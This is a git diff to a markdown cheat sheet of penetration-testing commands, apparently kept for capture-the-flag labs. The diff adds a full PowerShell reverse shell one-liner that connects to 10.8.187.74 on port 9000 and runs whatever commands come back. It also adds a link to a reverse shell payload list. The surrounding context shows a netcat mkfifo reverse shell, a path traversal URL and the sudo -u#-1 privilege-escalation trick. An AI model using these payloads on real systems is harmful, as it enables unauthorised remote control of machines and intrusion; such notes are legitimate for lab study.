@@ -22,6 +22,7 @@ Collection of useful penetration testing and hacking commands.
 - [Bash reverse shell](#bash-reverse-shell)
 - [NFS](#nfs)
 - [Socat](#socat)
+- [Powershell reverse shell](#windows-reverse-shell)
 
 ----
 
@@ -474,6 +475,15 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.187.74 9000 >/tmp/f
 ````
 
+----
+
+# Windows reverse shell
+````
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.187.74',9000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+````
+
+----
+
 -----------------------------------------------------
 
 
@@ -522,5 +532,8 @@ Syntaxe : sudo -u#-1 ...
 
 #Exploit SUDO restriction
 sudo -u#-1 <COMMAND>
+
+#Reverse Shell source
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 ----
